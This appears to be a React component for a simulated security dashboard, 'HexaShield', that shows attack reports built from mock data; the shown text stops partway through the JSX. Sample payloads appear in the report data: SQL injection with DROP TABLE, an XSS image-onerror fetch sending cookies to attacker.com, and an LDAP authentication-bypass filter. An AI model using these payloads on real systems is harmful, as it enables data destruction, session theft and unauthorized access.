import React, { useState, useEffect } from 'react';
import { Shield, AlertCircle, CheckCircle, Server, Database, Users, Globe, Activity, Code, Lock, FileText, Info, ExternalLink, ArrowLeft, Download, Printer, Zap, AlertTriangle } from 'lucide-react';
import { PieChart, Pie, Cell, ResponsiveContainer, Tooltip, Legend, BarChart, Bar, XAxis, YAxis, CartesianGrid, LineChart, Line, AreaChart, Area } from 'recharts';
import { useNavigate, useSearchParams } from 'react-router-dom';

const AttackReportPage = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const [activeTab, setActiveTab] = useState('overview');
  const [report, setReport] = useState(null);
  const [loading, setLoading] = useState(true);
  const attackType = searchParams.get('attack') || 'sql_injection';

  // Generate report data based on attack type
  useEffect(() => {
    setLoading(true);
    
    // Simulate API call to generate report
    setTimeout(() => {
      const generatedReport = generateReportData(attackType);
      setReport(generatedReport);
      setLoading(false);
    }, 1000);
  }, [attackType]);

  const handleBack = () => {
    navigate(-1);
  };

  const generateReportData = (type) => {
    const commonData = {
      id: `attack-${Date.now()}`,
      timestamp: new Date().toISOString(),
      duration: '00:02:35',
      preventionRate: 96,
      detectionTime: '0.38s',
      responseTime: '0.64s',
      totalAttackVectors: 12,
      blockedAttacks: 11,
      detectedAttacks: 1,
      successfulAttacks: 0,
      attackStages: [
        { name: 'Reconnaissance', blocked: 3, detected: 0, successful: 0 },
        { name: 'Initial Access', blocked: 4, detected: 0, successful: 0 },
        { name: 'Execution', blocked: 3, detected: 1, successful: 0 },
        { name: 'Persistence', blocked: 1, detected: 0, successful: 0 }
      ],
      securityModules: [
        { name: 'Web Application Firewall', blockedCount: 7, effectiveness: 97, tool: 'ModSecurity' },
        { name: 'Database Firewall', blockedCount: 3, effectiveness: 95, tool: 'GreenSQL' },
        { name: 'Network IDS', blockedCount: 1, effectiveness: 94, tool: 'Suricata' },
        { name: 'Authentication System', blockedCount: 0, effectiveness: 92, tool: 'Keycloak' }
      ],
      timeline: [
        { time: '00:00:00', event: 'Attack simulation started', component: 'HexaShield Core', category: 'info' },
        { time: '00:00:12', event: 'Suspicious network traffic detected', component: 'Suricata IDS', category: 'detection' },
        { time: '00:00:18', event: 'Traffic identified as potential attack', component: 'ModSecurity WAF', category: 'detection' },
        { time: '00:00:19', event: 'Countermeasures activated', component: 'HexaShield Protection', category: 'response' },
        { time: '00:00:45', event: 'Attack attempt blocked', component: 'ModSecurity WAF', category: 'protection' },
        { time: '00:01:15', event: 'Secondary attack vector detected', component: 'GreenSQL', category: 'detection' },
        { time: '00:01:16', event: 'Database protection engaged', component: 'GreenSQL', category: 'response' },
        { time: '00:01:32', event: 'Attack source IP blocked', component: 'PacketFence', category: 'response' },
        { time: '00:02:00', event: 'Security rules updated', component: 'HexaShield Core', category: 'response' },
        { time: '00:02:35', event: 'Attack simulation completed', component: 'HexaShield Core', category: 'info' }
      ]
    };

    // Attack-specific data
    if (type === 'sql_injection') {
      return {
        ...commonData,
        title: 'SQL Injection Attack',
        description: 'A sophisticated SQL injection attack was attempted against the application database, targeting user data extraction.',
        attackVectors: [
          { name: 'UNION-based Injection', percentage: 45, color: '#3B82F6' },
          { name: 'Error-based Injection', percentage: 25, color: '#8B5CF6' },
          { name: 'Boolean-based Injection', percentage: 15, color: '#EC4899' },
          { name: 'Time-based Injection', percentage: 10, color: '#F59E0B' },
          { name: 'Out-of-band Injection', percentage: 5, color: '#EF4444' }
        ],
        targetedComponents: ['Web Application Server', 'Database Server'],
        attackFlow: {
          source: { name: 'Attacker', type: 'external' },
          path: [
            { name: 'Internet Gateway', type: 'network' },
            { name: 'Web Application Server', type: 'server' },
            { name: 'Database Server', type: 'database' }
          ],
          target: { name: 'User Data', type: 'data' }
        },
        attackTechniques: [
          'Injection of malicious SQL code in input fields',
          'Execution of unauthorized database queries',
          'Attempt to extract sensitive user information',
          'Bypassing of input validation controls'
        ],
        vulnerabilities: [
          'Insufficient input validation in search function',
          'Lack of parameterized queries in legacy code',
          'Overly permissive database user privileges'
        ],
        defenses: [
          'ModSecurity WAF with OWASP CRS rules blocked initial attack attempts',
          'GreenSQL Database Firewall prevented unauthorized query execution',
          'Suricata IDS detected abnormal database traffic patterns',
          'Input sanitization prevented SQL code execution'
        ],
        recommendations: [
          'Implement consistent parameterized queries across all database interactions',
          'Review and reduce database user privileges following least privilege principle',
          'Enhance input validation for all user-supplied data',
          'Regularly update SQL injection signatures and rules'
        ],
        payload: {
          sample: "' OR 1=1; DROP TABLE users; --",
          description: 'This payload attempts to exploit vulnerable SQL queries by using string concatenation to modify the original query logic and execute dangerous operations.'
        }
      };
    } else if (type === 'xss') {
      return {
        ...commonData,
        title: 'Cross-Site Scripting (XSS) Attack',
        description: 'A persistent cross-site scripting attack was attempted against the web application, targeting session hijacking and data theft.',
        attackVectors: [
          { name: 'Stored XSS', percentage: 40, color: '#3B82F6' },
          { name: 'Reflected XSS', percentage: 35, color: '#8B5CF6' },
          { name: 'DOM-based XSS', percentage: 20, color: '#EC4899' },
          { name: 'Mutation-based XSS', percentage: 5, color: '#F59E0B' }
        ],
        targetedComponents: ['Web Application', 'User Browser Session'],
        attackFlow: {
          source: { name: 'Attacker', type: 'external' },
          path: [
            { name: 'Internet Gateway', type: 'network' },
            { name: 'Web Application Server', type: 'server' },
            { name: 'User Browser', type: 'browser' }
          ],
          target: { name: 'User Session Data', type: 'data' }
        },
        attackTechniques: [
          'Injection of malicious JavaScript in form fields',
          'Bypassing of client-side input validation',
          'Attempt to steal session cookies and authentication tokens',
          'Persistent payload storage in application database'
        ],
        vulnerabilities: [
          'Inadequate output encoding in user profile page',
          'Missing Content Security Policy headers',
          'Insufficient input validation for user-generated content'
        ],
        defenses: [
          'ModSecurity WAF detected and blocked malicious scripts',
          'DOMPurify active sanitization prevented script execution',
          'Output encoding protected against script injection',
          'HTTP-only cookie flags prevented session token theft'
        ],
        recommendations: [
          'Implement Content Security Policy headers across all pages',
          'Enforce consistent output encoding for all user-generated content',
          'Adopt modern frameworks with built-in XSS protection',
          'Enable additional browser security headers (X-XSS-Protection)'
        ],
        payload: {
          sample: "<img src='x' onerror='fetch(\"https://attacker.com/steal?cookie=\"+document.cookie)'>",
          description: 'This payload attempts to execute arbitrary JavaScript when an image fails to load, exfiltrating sensitive cookie information to an external server.'
        }
      };
    } else if (type === 'ldap_injection') {
      return {
        ...commonData,
        title: 'LDAP Injection Attack',
        description: 'An LDAP injection attack was attempted against the authentication system, aiming to bypass authentication and access sensitive directory information.',
        attackVectors: [
          { name: 'Authentication Bypass', percentage: 55, color: '#3B82F6' },
          { name: 'Information Disclosure', percentage: 25, color: '#8B5CF6' },
          { name: 'Privilege Escalation', percentage: 15, color: '#EC4899' },
          { name: 'Filter Manipulation', percentage: 5, color: '#F59E0B' }
        ],
        targetedComponents: ['Authentication Server', 'Directory Service'],
        attackFlow: {
          source: { name: 'Attacker', type: 'external' },
          path: [
            { name: 'Internet Gateway', type: 'network' },
            { name: 'Authentication Server', type: 'server' },
            { name: 'Directory Service', type: 'ldap' }
          ],
          target: { name: 'User Credentials', type: 'data' }
        },
        attackTechniques: [
          'Injection of malicious LDAP filter syntax in login fields',
          'Manipulation of search filters to bypass authentication',
          'Attempt to extract directory information',
          'Elevation of privileges through filter manipulation'
        ],
        vulnerabilities: [
          'Insufficient input validation in authentication forms',
          'Improper handling of special characters in LDAP queries',
          'Overly permissive directory access controls'
        ],
        defenses: [
          'Keycloak authentication system detected malicious input patterns',
          'Input validation filtered out dangerous LDAP special characters',
          'ModSecurity WAF blocked suspicious authentication attempts',
          'Proper LDAP query escaping prevented filter manipulation'
        ],
        recommendations: [
          'Implement strict input validation for all authentication fields',
          'Use parameterized LDAP filters for all directory queries',
          'Apply the principle of least privilege for directory access',
          'Regular security audits of authentication systems'
        ],
        payload: {
          sample: "username=*)(|(password=*))(& (objectClass=*)",
          description: 'This payload attempts to manipulate LDAP filter syntax to bypass authentication by creating a condition that always evaluates to true.'
        }
      };
    }

    // Default to SQL injection if type is not recognized
    return generateReportData('sql_injection');
  };

  // Custom tooltip for charts
  const CustomTooltip = ({ active, payload, label }) => {
    if (active && payload && payload.length) {
      return (
        <div className="bg-gray-800 p-3 border border-gray-700 rounded shadow-lg">
          <p className="text-gray-300 font-medium">{label}</p>
          {payload.map((entry, index) => (
            <p key={`item-${index}`} style={{ color: entry.color || entry.fill }} className="text-sm">
              {`${entry.name}: ${entry.value}`}
            </p>
          ))}
        </div>
      );
    }
    return null;
  };

  // Render network visualization
  const NetworkVisualization = ({ attackFlow, attackType }) => {
    // Constants for visualization
    const nodeRadius = 30;
    const nodeSpacing = 150;
    const baseY = 100;
    
    // Calculate positions
    const nodes = [attackFlow.source, ...attackFlow.path, attackFlow.target];
    const positions = nodes.map((node, index) => ({
      ...node,
      x: 100 + index * nodeSpacing,
      y: baseY + (index % 2 === 0 ? -20 : 20) // slight zigzag for visual interest
    }));

    // Node icons based on type
    const getNodeIcon = (type) => {
      switch (type) {
        case 'external':
          return <Users className="h-8 w-8 text-red-500" />;
        case 'network':
          return <Globe className="h-8 w-8 text-blue-500" />;
        case 'server':
          return <Server className="h-8 w-8 text-green-500" />;
        case 'database':
          return <Database className="h-8 w-8 text-purple-500" />;
        case 'browser':
          return <Code className="h-8 w-8 text-amber-500" />;
        case 'ldap':
          return <Lock className="h-8 w-8 text-cyan-500" />;
        case 'data':
          return <FileText className="h-8 w-8 text-gray-500" />;
        default:
          return <Server className="h-8 w-8 text-gray-500" />;
      }
    };

    // HexaShield protection points
    const protectionPoints = {
      'sql_injection': [
        { x: positions[2].x - 40, y: positions[2].y - 60, tool: 'ModSecurity WAF', icon: <Shield className="h-7 w-7 text-blue-400" /> },
        { x: positions[3].x - 40, y: positions[3].y - 60, tool: 'GreenSQL', icon: <Shield className="h-7 w-7 text-green-400" /> }
      ],
      'xss': [
        { x: positions[2].x - 40, y: positions[2].y - 60, tool: 'ModSecurity WAF', icon: <Shield className="h-7 w-7 text-blue-400" /> },
        { x: positions[3].x - 40, y: positions[3].y - 60, tool: 'DOMPurify', icon: <Shield className="h-7 w-7 text-purple-400" /> }
      ],
      'ldap_injection': [
        { x: positions[2].x - 40, y: positions[2].y - 60, tool: 'Input Validation', icon: <Shield className="h-7 w-7 text-blue-400" /> },
        { x: positions[3].x - 40, y: positions[3].y - 60, tool: 'Keycloak', icon: <Shield className="h-7 w-7 text-amber-400" /> }
      ]
    };

    return (
      <div className="w-full h-96 bg-gray-850 rounded-lg border border-gray-700 overflow-hidden relative">
        <svg width="100%" height="100%" viewBox="0 0 800 200">
          {/* Connection lines */}
          {positions.map((node, index) => {
            if (index === positions.length - 1) return null;
            
            const nextNode = positions[index + 1];
            const isBlocked = index === 2; // Assume attack is blocked at position 3 (index 2)
            
            return (
              <line 
                key={`line-${index}`} 
                x1={node.x + nodeRadius} 
                y1={node.y} 
                x2={nextNode.x - nodeRadius} 
                y2={nextNode.y}
                stroke={isBlocked ? "#ef4444" : "#6b7280"}
                strokeWidth={2}
                strokeDasharray={isBlocked ? "5,5" : "none"}
              />
            );
          })}
          
          {/* Attack path nodes */}
          {positions.map((node, index) => (
            <g key={`node-${index}`} transform={`translate(${node.x}, ${node.y})`}>
              <circle 
                r={nodeRadius} 
                fill="#1f2937" 
                stroke={index === 0 ? "#ef4444" : index === positions.length - 1 ? "#3b82f6" : "#4b5563"}
                strokeWidth={2}
              />
              <g transform="translate(-12, -12)">
                {getNodeIcon(node.type)}
              </g>
              <text 
                y={nodeRadius + 20} 
                textAnchor="middle" 
                fill="#d1d5db" 
                className="text-xs"
              >
                {node.name}
              </text>
            </g>
          ))}
          
          {/* Protection shield icons */}
          {protectionPoints[attackType]?.map((point, index) => (
            <g key={`protection-${index}`} transform={`translate(${point.x}, ${point.y})`}>
              <circle r={20} fill="#374151" stroke="#3b82f6" strokeWidth={2} strokeDasharray="4,2" />
              <g transform="translate(-10, -10)">
                {point.icon}
              </g>
              <text 
                y={30} 
                textAnchor="middle" 
                fill="#60a5fa" 
                className="text-xs font-medium"
              >
                {point.tool}
              </text>
            </g>
          ))}
          
          {/* Block icon where attack was stopped */}
          <g transform={`translate(${positions[2].x + nodeRadius + 30}, ${positions[2].y})`}>
            <circle r={15} fill="#b91c1c" />
            <g transform="translate(-8, -8)">
              <AlertCircle className="h-4 w-4 text-white" />
            </g>
            <text 
              y={25} 
              textAnchor="middle" 
              fill="#ef4444" 
              className="text-xs font-medium"
            >
              Attack Blocked
            </text>
          </g>
        </svg>
      </div>
    );
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center h-96">
        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500"></div>
      </div>
    );
  }

  if (!report) {
    return (
      <div className="bg-gray-800 rounded-lg p-6 text-center">
        <AlertCircle className="h-12 w-12 text-yellow-500 mx-auto mb-4" />
        <h3 className="text-xl font-medium text-white mb-2">Report Not Available</h3>
        <p className="text-gray-400">
          The attack report could not be generated. Please try running the simulation again.
        </p>
      </div>
    );
  }

  return (
    <div className="bg-gray-800 rounded-lg shadow-lg overflow-hidden mb-6">
      {/* Header */}
      <div className="p-6 bg-gray-750 border-b border-gray-700">
        <div className="flex flex-col md:flex-row items-start md:items-center justify-between">
          <div className="flex items-center">
            <button 
              className="mr-4 p-2 rounded-full hover:bg-gray-700 text-gray-400 hover:text-white"
              onClick={handleBack}
            >
              <ArrowLeft className="h-5 w-5" />
            </button>
            <div>
              <h2 className="text-2xl font-bold text-white">
                {report.title} Attack Report
              </h2>
              <p className="text-gray-400 text-sm">
                Generated on {new Date().toLocaleString()} • Duration: {report.duration}
              </p>
            </div>
          </div>
          <div className="flex items-center space-x-2 mt-4 md:mt-0">
            <button className="flex items-center px-3 py-2 bg-gray-700 hover:bg-gray-600 text-white rounded">
              <Printer className="h-4 w-4 mr-2" />
              Print
            </button>
            <button className="flex items-center px-3 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded">
              <Download className="h-4 w-4 mr-2" />
              Download PDF
            </button>
          </div>
        </div>
      </div>

      {/* Tab Navigation */}
      <div className="bg-gray-750 border-b border-gray-700">
        <div className="flex overflow-x-auto">
          <button 
            className={`p-4 text-sm font-medium ${activeTab === 'overview' ? 'text-blue-500 border-b-2 border-blue-500' : 'text-gray-400 hover:text-gray-300'}`}
            onClick={() => setActiveTab('overview')}
          >
            Overview
          </button>
          <button 
            className={`p-4 text-sm font-medium ${activeTab === 'timeline' ? 'text-blue-500 border-b-2 border-blue-500' : 'text-gray-400 hover:text-gray-300'}`}
            onClick={() => setActiveTab('timeline')}
          >
            Attack Timeline
          </button>
          <button 
            className={`p-4 text-sm font-medium ${activeTab === 'protection' ? 'text-blue-500 border-b-2 border-blue-500' : 'text-gray-400 hover:text-gray-300'}`}
            onClick={() => setActiveTab('protection')}
          >
            Protection Details
          </button>
          <button 
            className={`p-4 text-sm font-medium ${activeTab === 'payload' ? 'text-blue-500 border-b-2 border-blue-500' : 'text-gray-400 hover:text-gray-300'}`}
            onClick={() => setActiveTab('payload')}
          >
            Attack Payload
          </button>
          <button 
            className={`p-4 text-sm font-medium ${activeTab === 'recommendations' ? 'text-blue-500 border-b-2 border-blue-500' : 'text-gray-400 hover:text-gray-300'}`}
            onClick={() => setActiveTab('recommendations')}
          >
            Recommendations
          </button>
        </div>
      </div>

      {/* Report Content */}
      <div className="p-6">
        {activeTab === 'overview' && (
          <div className="space-y-6">
            {/* Attack description */}
            <div className="bg-gray-750 p-5 rounded-lg border border-gray-700">
              <div className="flex items-start">
                <AlertCircle className="h-6 w-6 text-red-500 mr-3 mt-1" />
                <div>
                  <h3 className="text-lg font-medium text-white mb-2">Attack Summary</h3>
                  <p className="text-gray-300">{report.description}</p>
                </div>
              </div>
            </div>

            {/* Key metrics */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
              <div className="bg-gray-750 p-4 rounded-lg border border-gray-700">
                <div className="flex justify-between items-center">
                  <div>
                    <p className="text-sm text-gray-400">Prevention Rate</p>
                    <p className="text-2xl font-bold text-green-500">{report.preventionRate}%</p>
                  </div>
                  <div className="p-3 bg-green-900 bg-opacity-20 rounded-lg">
                    <Shield className="h-6 w-6 text-green-500" />
                  </div>
                </div>
              </div>
              
              <div className="bg-gray-750 p-4 rounded-lg border border-gray-700">
                <div className="flex justify-between items-center">
                  <div>
                    <p className="text-sm text-gray-400">Detection Time</p>
                    <p className="text-2xl font-bold text-blue-500">{report.detectionTime}</p>
                  </div>
                  <div className="p-3 bg-blue-900 bg-opacity-20 rounded-lg">
                    <Activity className="h-6 w-6 text-blue-500" />
                  </div>
                </div>
              </div>
              
              <div className="bg-gray-750 p-4 rounded-lg border border-gray-700">
                <div className="flex justify-between items-center">
                  <div>
                    <p className="text-sm text-gray-400">Response Time</p>
                    <p className="text-2xl font-bold text-purple-500">{report.responseTime}</p>
                  </div>
                  <div className="p-3 bg-purple-900 bg-opacity-20 rounded-lg">
                    <Zap className="h-6 w-6 text-purple-500" />
                  </div>
                </div>
              </div>
              
              <div className="bg-gray-750 p-4 rounded-lg border border-gray-700">
                <div className="flex justify-between items-center">
                  <div>
                    <p className="text-sm text-gray-400">Attacks Mitigated</p>
                    <p className="text-2xl font-bold text-amber-500">{report.blockedAttacks}/{report.totalAttackVectors}</p>
                  </div>
                  <div className="p-3 bg-amber-900 bg-opacity-20 rounded-lg">
                    <Shield className="h-6 w-6 text-amber-500" />
                  </div>
                </div>
              </div>
            </div>

            {/* Attack Flow Visualization */}
            <div className="bg-gray-750 p-5 rounded-lg border border-gray-700">
              <h3 className="text-lg font-medium text-white mb-4">Attack Flow Visualization</h3>
              <NetworkVisualization attackFlow={report.attackFlow} attackType={attackType} />
              <div className="flex flex-wrap gap-3 mt-4 text-sm text-gray-300">
                <div className="flex items-center">
                  <div className="w-3 h-3 rounded-full bg-red-500 mr-1"></div>
                  <span>Attacker</span>
                </div>
                <div className="flex items-center">
                  <div className="w-3 h-3 rounded-full bg-blue-500 mr-1"></div>
                  <span>Protected Asset</span>
                </div>
                <div className="flex items-center">
                  <div className="w-3 h-3 rounded-full bg-green-500 mr-1"></div>
                  <span>Server</span>
                </div>
                <div className="flex items-center">
                  <div className="w-3 h-3 rounded-full bg-purple-500 mr-1"></div>
                  <span>Database</span>
                </div>
                <div className="flex items-center">
                  <div className="w-3 h-3 border-2 border-blue-500 mr-1"></div>
                  <span>HexaShield Protection</span>
                </div>
              </div>
            </div>

            {/* Attack vectors and protected components */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              {/* Attack Vectors */}
              <div className="bg-gray-750 p-5 rounded-lg border border-gray-700">
                <h3 className="text-lg font-medium text-white mb-4">Attack Vectors</h3>
                <div className="h-60">
                  <ResponsiveContainer width="100%" height="100%">
                    <PieChart>
                      <Pie
                        data={report.attackVectors}
                        cx="50%"
                        cy="50%"
                        innerRadius={60}
                        outerRadius={80}
                        paddingAngle={2}
                        dataKey="percentage"
                        label={({ name, percent }) => `${name} (${(percent * 100).toFixed(0)}%)`}
                        labelLine={false}
                      >
                        {report.attackVectors.map((entry, index) => (
                          <Cell key={`cell-${index}`} fill={entry.color} />
                        ))}
                      </Pie>
                      <Tooltip content={<CustomTooltip />} />
                      <Legend verticalAlign="bottom" height={36} />
                    </PieChart>
                  </ResponsiveContainer>
                </div>
              </div>
              
              {/* Attack stages */}
              <div className="bg-gray-750 p-5 rounded-lg border border-gray-700">
                <h3 className="text-lg font-medium text-white mb-4">Attack Progression</h3>
                <div className="h-60">
                  <ResponsiveContainer width="100%" height="100%">
                    <BarChart
                      data={report.attackStages}
                      margin={{ top: 10, right: 30, left: 0, bottom: 20 }}
                    >
                      <CartesianGrid strokeDasharray="3 3" stroke="#374151" />
                      <XAxis dataKey="name" stroke="#9CA3AF" />
                      <YAxis stroke="#9CA3AF" />
                      <Tooltip content={<CustomTooltip />} />
                      <Legend verticalAlign="top" height={36} />
                      <Bar dataKey="blocked" name="Blocked" fill="#10B981" />
                      <Bar dataKey="detected" name="Detected" fill="#F59E0B" />
                      <Bar dataKey="successful" name="Successful" fill="#EF4444" />
                    </BarChart>
                  </ResponsiveContainer>
                </div>
              </div>
            </div>

            {/* Attack Techniques and Vulnerabilities */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <div className="bg-gray-750 p-5 rounded-lg border border-gray-700">
                <h3 className="text-lg font-medium text-white mb-4">Attack Techniques</h3>
                <ul className="space-y-2">
                  {report.attackTechniques.map((technique, index) => (
                    <li key={index} className="flex items-start">
                      <AlertTriangle className="h-5 w-5 text-red-500 mr-2 mt-1 flex-shrink-0" />
                      <span className="text-gray-300">{technique}</span>
                    </li>
                  ))}
                </ul>
              </div>
              
              <div className="bg-gray-750 p-5 rounded-lg border border-gray-700">
                <h3 className="text-lg font-medium text-white mb-4">Targeted Vulnerabilities</h3>
                <ul className="space-y-2">
                  {report.vulnerabilities.map((vulnerability, index) => (
                    <li key={index} className="flex items-start">
                      <AlertCircle className="h-5 w-5 text-amber-500 mr-2 mt-1 flex-shrink-0" />
                      <span className="text-gray-300">{vulnerability}</span>
                    </li>
                  ))}
                </ul>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'timeline' && (
          <div>
            <div className="bg-gray-750 p-5 rounded-lg border border-gray-700 mb-6">
              <h3 className="text-lg font-medium text-white mb-4">Attack Timeline</h3>
              <div className="relative">
                {/* Timeline event flow */}
                <div className="ml-6 border-l-2 border-gray-600 pb-1">
                  {report.timeline.map((event, index) => (
                    <div key={index} className="mb-6 ml-6 relative">
                      {/* Timeline dot */}
                      <div className={`absolute -left-9 mt-1.5 w-4 h-4 rounded-full ${
                        event.category === 'info' ? 'bg-blue-500' :
                        event.category === 'detection' ? 'bg-yellow-500' :
                        event.category === 'response' ? 'bg-purple-500' :
                        event.category === 'protection' ? 'bg-green-500' : 'bg-gray-500'
                      }`}></div>
                      
                      {/* Timeline content */}
                      <div className="bg-gray-800 p-3 rounded-lg border border-gray-650">
                        <div className="flex flex-col md:flex-row md:items-center justify-between mb-1">
                          <h4 className="text-white font-medium">{event.event}</h4>
                          <span className="text-sm text-gray-400">{event.time}</span>
                        </div>
                        <p className="text-sm text-gray-300">Component: {event.component}</p>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
            
            {/* Timeline Metrics */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <div className="bg-gray-750 p-5 rounded-lg border border-gray-700">
                <h3 className="text-lg font-medium text-white mb-4">Event Categories</h3>
                <div className="h-60">
                  <ResponsiveContainer width="100%" height="100%">
                    <PieChart>
                      <Pie
                        data={[
                          { name: 'Detection', value: report.timeline.filter(e => e.category === 'detection').length, color: '#F59E0B' },
                          { name: 'Response', value: report.timeline.filter(e => e.category === 'response').length, color: '#8B5CF6' },
                          { name: 'Protection', value: report.timeline.filter(e => e.category === 'protection').length, color: '#10B981' },
                          { name: 'Info', value: report.timeline.filter(e => e.category === 'info').length, color: '#3B82F6' }
                        ]}
                        cx="50%"
                        cy="50%"
                        innerRadius={60}
                        outerRadius={80}
                        paddingAngle={2}
                        dataKey="value"
                        label={({ name, percent }) => `${name} (${(percent * 100).toFixed(0)}%)`}
                        labelLine={false}
                      >
                        {[
                          { color: '#F59E0B' },
                          { color: '#8B5CF6' },
                          { color: '#10B981' },
                          { color: '#3B82F6' }
                        ].map((entry, index) => (
                          <Cell key={`cell-${index}`} fill={entry.color} />
                        ))}
                      </Pie>
                      <Tooltip content={<CustomTooltip />} />
                      <Legend verticalAlign="bottom" height={36} />
                    </PieChart>
                  </ResponsiveContainer>
                </div>
              </div>
              
              <div className="bg-gray-750 p-5 rounded-lg border border-gray-700">
                <h3 className="text-lg font-medium text-white mb-4">Component Activity</h3>
                <div className="h-60">
                  <ResponsiveContainer width="100%" height="100%">
                    <BarChart
                      data={[...new Set(report.timeline.map(e => e.component))].map(component => ({
                        name: component,
                        count: report.timeline.filter(e => e.component === component).length,
                        color: component.includes('ModSecurity') ? '#8B5CF6' :
                              component.includes('GreenSQL') ? '#10B981' :
                              component.includes('Suricata') ? '#3B82F6' :
                              component.includes('HexaShield') ? '#F59E0B' : '#6B7280'
                      }))}
                      layout="vertical"
                      margin={{ top: 5, right: 30, left: 120, bottom: 5 }}
                    >
                      <CartesianGrid strokeDasharray="3 3" stroke="#374151" horizontal={false} />
                      <XAxis type="number" stroke="#9CA3AF" />
                      <YAxis 
                        type="category" 
                        dataKey="name" 
                        stroke="#9CA3AF" 
                        width={120}
                        tick={{ fontSize: 12 }}
                      />
                      <Tooltip content={<CustomTooltip />} />
                      <Bar 
                        dataKey="count" 
                        name="Events" 
                        radius={[0, 4, 4, 0]}
                      >
                        {[...new Set(report.timeline.map(e => e.component))].map((component, index) => (
                          <Cell 
                            key={`cell-${index}`} 
                            fill={component.includes('ModSecurity') ? '#8B5CF6' :
                                  component.includes('GreenSQL') ? '#10B981' :
                                  component.includes('Suricata') ? '#3B82F6' :
                                  component.includes('HexaShield') ? '#F59E0B' : '#6B7280'} 
                          />
                        ))}
                      </Bar>
                    </BarChart>
                  </ResponsiveContainer>
                </div>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'protection' && (
          <div className="space-y-6">
            {/* Protection Summary */}
            <div className="bg-gray-750 p-5 rounded-lg border border-gray-700">
              <div className="flex items-start">
                <Shield className="h-6 w-6 text-green-500 mr-3 mt-1" />
                <div>
                  <h3 className="text-lg font-medium text-white mb-2">Protection Summary</h3>
                  <p className="text-gray-300">
                    HexaShield's multi-layered defense successfully mitigated the {report.title.toLowerCase()} attack, blocking {report.blockedAttacks} of {report.totalAttackVectors} attack vectors and detecting the remaining {report.detectedAttacks}. The protection components worked in concert to identify and neutralize the threat in real-time.
                  </p>
                </div>
              </div>
            </div>
            
            {/* Security Module Effectiveness */}
            <div className="bg-gray-750 p-5 rounded-lg border border-gray-700">
              <h3 className="text-lg font-medium text-white mb-4">Security Module Effectiveness</h3>
              <div className="space-y-4">
                {report.securityModules.map((module, index) => (
                  <div key={index} className="space-y-1">
                    <div className="flex justify-between items-center">
                      <div className="flex items-center">
                        {module.tool === 'ModSecurity' && <Shield className="h-5 w-5 text-purple-500 mr-2" />}
                        {module.tool === 'GreenSQL' && <Database className="h-5 w-5 text-green-500 mr-2" />}
                        {module.tool === 'Suricata' && <Activity className="h-5 w-5 text-blue-500 mr-2" />}
                        {module.tool === 'Keycloak' && <Lock className="h-5 w-5 text-amber-500 mr-2" />}
                        <span className="text-white font-medium">{module.name}</span>
                      </div>
                      <div className="flex items-center">
                        <span className="text-sm text-white mr-2">{module.effectiveness}%</span>
                        <Info className="h-4 w-4 text-blue-400" />
                      </div>
                    </div>
                    <div className="w-full bg-gray-700 rounded-full h-2.5">
                      <div
                        className={`h-2.5 rounded-full ${
                          module.effectiveness > 95 ? 'bg-green-500' :
                          module.effectiveness > 90 ? 'bg-blue-500' :
                          module.effectiveness > 80 ? 'bg-yellow-500' : 'bg-red-500'
                        }`}
                        style={{ width: `${module.effectiveness}%` }}
                      ></div>
                    </div>
                    <div className="flex justify-between items-center text-xs text-gray-400">
                      <span>Tool: {module.tool}</span>
                      <span>Blocked {module.blockedCount} attacks</span>
                    </div>
                  </div>
                ))}
              </div>
            </div>
            
            {/* Defense Details */}
            <div className="bg-gray-750 p-5 rounded-lg border border-gray-700">
              <h3 className="text-lg font-medium text-white mb-4">Defense Mechanisms</h3>
              <ul className="space-y-3">
                {report.defenses.map((defense, index) => (
                  <li key={index} className="flex items-start bg-gray-800 p-3 rounded-lg">
                    <CheckCircle className="h-5 w-5 text-green-500 mr-2 mt-1 flex-shrink-0" />
                    <span className="text-gray-300">{defense}</span>
                  </li>
                ))}
              </ul>
            </div>
            
            {/* Protection Metrics Chart */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <div className="bg-gray-750 p-5 rounded-lg border border-gray-700">
                <h3 className="text-lg font-medium text-white mb-4">Attack Response Time</h3>
                <div className="h-60">
                  <ResponsiveContainer width="100%" height="100%">
                    <LineChart
                      data={[
                        { name: 'Detection', time: 0.38 },
                        { name: 'Analysis', time: 0.42 },
                        { name: 'Decision', time: 0.56 },
                        { name: 'Response', time: 0.64 },
                        { name: 'Mitigation', time: 0.75 }
                      ]}
                      margin={{ top: 5, right: 30, left: 20, bottom: 5 }}
                    >
                      <CartesianGrid strokeDasharray="3 3" stroke="#374151" />
                      <XAxis dataKey="name" stroke="#9CA3AF" />
                      <YAxis stroke="#9CA3AF" label={{ value: 'Seconds', angle: -90, position: 'insideLeft', style: { fill: '#9CA3AF' } }} />
                      <Tooltip content={<CustomTooltip />} />
                      <Line 
                        type="monotone" 
                        dataKey="time" 
                        name="Time (s)" 
                        stroke="#8B5CF6" 
                        strokeWidth={2}
                        activeDot={{ r: 8 }}
                      />
                    </LineChart>
                  </ResponsiveContainer>
                </div>
              </div>
              
              <div className="bg-gray-750 p-5 rounded-lg border border-gray-700">
                <h3 className="text-lg font-medium text-white mb-4">Protection Events</h3>
                <div className="h-60">
                  <ResponsiveContainer width="100%" height="100%">
                    <AreaChart
                      data={[
                        { time: '0:00', events: 0 },
                        { time: '0:30', events: 4 },
                        { time: '1:00', events: 7 },
                        { time: '1:30', events: 9 },
                        { time: '2:00', events: 11 },
                        { time: '2:30', events: 12 }
                      ]}
                      margin={{ top: 5, right: 30, left: 20, bottom: 5 }}
                    >
                      <defs>
                        <linearGradient id="colorEvents" x1="0" y1="0" x2="0" y2="1">
                          <stop offset="5%" stopColor="#10B981" stopOpacity={0.8}/>
                          <stop offset="95%" stopColor="#10B981" stopOpacity={0}/>
                        </linearGradient>
                      </defs>
                      <CartesianGrid strokeDasharray="3 3" stroke="#374151" />
                      <XAxis dataKey="time" stroke="#9CA3AF" />
